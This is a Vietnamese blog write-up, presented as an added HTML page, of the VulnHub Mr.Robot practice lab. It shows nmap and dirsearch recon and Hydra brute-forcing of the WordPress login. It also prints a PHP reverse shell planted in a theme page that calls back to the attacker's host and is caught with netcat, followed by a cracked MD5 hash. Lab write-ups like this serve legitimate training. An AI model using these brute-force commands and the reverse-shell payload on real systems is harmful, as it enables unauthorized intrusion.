@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: MR-ROBOT: 1Difficulty: Chả biết, nhưng chắc là dễ…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] Mr.Robot">
+<meta property="og:url" content="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: MR-ROBOT: 1Difficulty: Chả biết, nhưng chắc là dễ…">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/mrrobot-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/7.png">
+<meta property="article:published_time" content="2021-02-03T03:23:56.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.607Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="medium">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/mrrobot-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/","path":"2021/02/03/mrrobot-vulnhub/","title":"[VulnHub] Mr.Robot"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] Mr.Robot | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dirsearch"><span class="nav-number">2.2.</span> <span class="nav-text">Dirsearch</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">3.</span> <span class="nav-text">Privileges Escalation</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/02/03/mrrobot-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] Mr.Robot | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] Mr.Robot
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-02-03 10:23:56" itemprop="dateCreated datePublished" datetime="2021-02-03T10:23:56+07:00">2021-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>10 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/mrrobot-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/mr-robot-1,151/">MR-ROBOT: 1</a><br>Difficulty: <em>Chả biết, nhưng chắc là dễ…</em></p>
+<span id="more"></span>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Lại là mấy cái lệnh cửa miệng với mấy bài boot2root trên Vulnhub… bla bla bla…</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sn 10.10.10.101-105</span>       </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:25 +07</span><br><span class="line">Nmap scan report for 10.10.10.101 (10.10.10.101)</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Nmap scan report for 10.10.10.102</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line"></span><br><span class="line">Nmap done: 5 IP addresses (2 hosts up) scanned in 1.26 seconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p- 10.10.10.102 --min-rate 3000</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:26 +07</span><br><span class="line">Nmap scan report for 10.10.10.102 (10.10.10.102)</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http</span><br><span class="line">443/tcp open   https</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 43.87 seconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p 22,80,443 -sC -sV 10.10.10.102</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:28 +07</span><br><span class="line">Nmap scan report for 10.10.10.102 (10.10.10.102)</span><br><span class="line">Host is up (0.00060s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="line">| Not valid before: 2015-09-16T10:45:03</span><br><span class="line">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds</span><br></pre></td></tr></table></figure>
+<p>Vậy là bài này đang mở 3 cổng TCP là 22, 80, và 443. Mô hình chung là sẽ đánh vào một lỗi nào đó trên web server cổng 80&#x2F;443 và cướp shell, leo quyền… chứ không lằng nhằng đến các service khác.<br><img src="/2021/02/03/mrrobot-vulnhub/1.png"><br>Okay, Dirsearch nó xem nào.</p>
+<h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><p>Kết quả dưới đây đã lọc hết các response có status khác 200, cho dễ nhìn. Nếu vẫn còn khó nhìn, thì tôi khuyên bạn nên dành mấy phút nghỉ ngơi xem pỏn giải trí đi.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[10:29:58] Starting: cookies.js</span><br><span class="line">[10:31:08] 200 -    1KB - /admin/</span><br><span class="line">[10:31:08] 200 -    1KB - /admin/?/login</span><br><span class="line">[10:31:10] 200 -    1KB - /admin/index</span><br><span class="line">[10:31:10] 200 -    1KB - /admin/index.html</span><br><span class="line">[10:32:26] 200 -    0B  - /favicon.ico</span><br><span class="line">[10:32:38] 200 -    1KB - /index.html</span><br><span class="line">[10:32:41] 200 -  504KB - /intro</span><br><span class="line">[10:32:47] 200 -  309B  - /license</span><br><span class="line">[10:32:47] 200 -  309B  - /license.txt</span><br><span class="line">[10:33:27] 200 -   64B  - /readme</span><br><span class="line">[10:33:27] 200 -   64B  - /readme.html</span><br><span class="line">[10:33:30] 200 -   41B  - /robots.txt</span><br><span class="line">[10:33:40] 200 -    0B  - /sitemap</span><br><span class="line">[10:33:40] 200 -    0B  - /sitemap.xml</span><br><span class="line">[10:33:40] 200 -    0B  - /sitemap.xml.gzhttp://10.10.10.102/sugarcrm/?module=Accounts&amp;action=ShowDuplicateshttp://10.10.10.102/sugarcrm/?module=Contacts&amp;action=ShowDuplicates%20</span><br><span class="line">[10:34:07] 200 -    1B  - /wp-admin/admin-ajax.php</span><br><span class="line">[10:34:07] 500 -    3KB - /wp-admin/setup-config.php</span><br><span class="line">[10:34:07] 200 -    0B  - /wp-config.php</span><br><span class="line">[10:34:07] 200 -    0B  - /wp-content/</span><br><span class="line">[10:34:08] 500 -    0B  - /wp-content/plugins/hello.php</span><br><span class="line">[10:34:08] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php</span><br><span class="line">[10:34:08] 200 -    0B  - /wp-cron.php</span><br><span class="line">[10:34:08] 200 -    3KB - /wp-login.php</span><br><span class="line">[10:34:08] 200 -    3KB - /wp-login</span><br><span class="line">[10:34:08] 200 -    3KB - /wp-login/</span><br></pre></td></tr></table></figure>
+<p>Có thể thấy ngay web server này sử dụng nền tảng Wordpress để xây dựng nội dung.<br>Kệ bà nó cái đã, vòng qua một vòng cái đống này xem nào.<br>Có cái này hay ho…<br><a target="_blank" rel="noopener" href="http://10.10.10.102/robots.txt">http://10.10.10.102/robots.txt</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://10.10.10.102/key-1-of-3.txt">http://10.10.10.102/key-1-of-3.txt</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
+<p>Đây là một flag mà đề bài yêu cầu tìm, không liên quan gì đến việc khai thác lỗi của bài.<br>Và một file nữa (<a target="_blank" rel="noopener" href="http://10.10.10.102/fsocity.dic">http://10.10.10.102/fsocity.dic</a>), nhìn là biết đây là một wordlist, tác giả đang muốn chúng ta sử dụng nó để tấn công brute-force ở một phần nào đó trong bài.<br><img src="/2021/02/03/mrrobot-vulnhub/5.png"><br>Đúng rồi đấy :D chỉ còn ở đây chứ còn ở đâu nữa. Thật ra vẫn còn chỗ nữa để brute-force đấy là cổng 22-SSH, cơ mà nếu brute-force thành công và lấy được SSH shell thì bài này quá ez, chả cần phải lần mò và web server để đào bới vấn đề.<br>Theo cái lối suy nghĩ cổ hủ và bảo thủ ấy, tôi quyết định brute-force trang login của Wordpress.<br>Đầu tiên là mò username. Wordpress có một cái sự ngớ ngẩn khi thông báo Login không thành công. Khi login với username không tồn tại trong hệ thống, nó sẽ trổ luôn ra một câu <em>Invalid user!</em>. Dafuk? Và nếu username có tồn tại trong hệ thống, nhưng sai password, lúc này sẽ là một thông báo khác là <em>Incorrect password</em>.<br>Đây vừa có thể là một lỗi, vừa có thể là một tính năng. Cơ mà bây giờ để bảo mật, các trang login thường sẽ để một thông báo chung chung ví dụ như “Username hoặc password mày vừa nhập có vấn đề” hoặc ngắn gọn hơn là “Đăng nhập éo thành công!”. Còn như thằng Wordpress này ấy, cái lỗi ở đây khiến cho kẻ tấn công có thể dò tìm được username, và sau đó sẽ dò tiếp password tương ứng với username, sẽ đỡ thời gian brute-force hơn rất nhiều so với việc dò tìm cả 2 cái này cùng một lúc.<br>Trình bày dài dòng là như thế, giờ thì dò username thôi :))<br>Ném cái wordlist vừa tìm được vào option -L (List user) và option -p là duma (Mật khẩu tự chọn).</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hydra -L fsocity.dic -p duma 10.10.10.102 http-post-form <span class="string">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid&quot;</span></span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-03 10:49:37</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task</span><br><span class="line">[DATA] attacking http-post-form://10.10.10.102:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid</span><br><span class="line">[80][http-post-form] host: 10.10.10.102   login: Elliot   password: duma</span><br><span class="line">[80][http-post-form] host: 10.10.10.102   login: elliot   password: duma</span><br><span class="line">[STATUS] 2090.00 tries/min, 2090 tries in 00:01h, 856145 to do in 06:50h, 16 active</span><br></pre></td></tr></table></figure>
+<p>Thế là tóm được thằng user Elloit&#x2F;elliot, do không phân biệt chữ hoa và chữ thường.<br>Tiếp theo là dò mật khẩu của thằng Elliot, lần này đợi hơi lâu nên tôi quyết định treo máy đấy và đi chơi game.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hydra -l elliot -P fsocity.dic 10.10.10.102 http-post-form <span class="string">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid&quot;</span></span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-03 10:52:31</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task</span><br><span class="line">[DATA] attacking http-post-form://10.10.10.102:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Incorrect</span><br><span class="line">[80][http-post-form] host: 10.10.10.102   login: elliot   password: ER28-0652</span><br></pre></td></tr></table></figure>
+<p>Nghe ổn đấy, login vào xem nào.<br><img src="/2021/02/03/mrrobot-vulnhub/6.png"><br>Để ý thấy Elliot đang là admin của trang này, toẹt vời, điều đó có nghĩa là Elliot có thể sửa đổi mã nguồn của các page như 404, header, poster các thứ… Không cần đến Wpscan để quét, chèn một đoạn shell PHP vào bất kỳ page nào trong phần Editer, miễn là truy cập được là được.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.10.10.101&quot;</span>,<span class="number">4444</span>);</span><br><span class="line"><span class="variable">$proc</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh -i&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>), <span class="variable">$pipes</span>);</span><br></pre></td></tr></table></figure>
+<p>Mở listen netcat trên port 4444 và lấy shell :))</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -klnvp 4444</span>                        </span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 10.10.10.102.</span><br><span class="line">Ncat: Connection from 10.10.10.102:35666.</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al</span></span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 2 root  root  4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..</span><br><span class="line">-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt</span><br><span class="line">-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> password.raw-md5</span></span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure>
+<p>Èn. Họ cho luôn mật khẩu hash của user robot này.<br><img src="/2021/02/03/mrrobot-vulnhub/7.png"><br><em>robot:abcdefghijklmnopqrstuvwxyz</em></p>
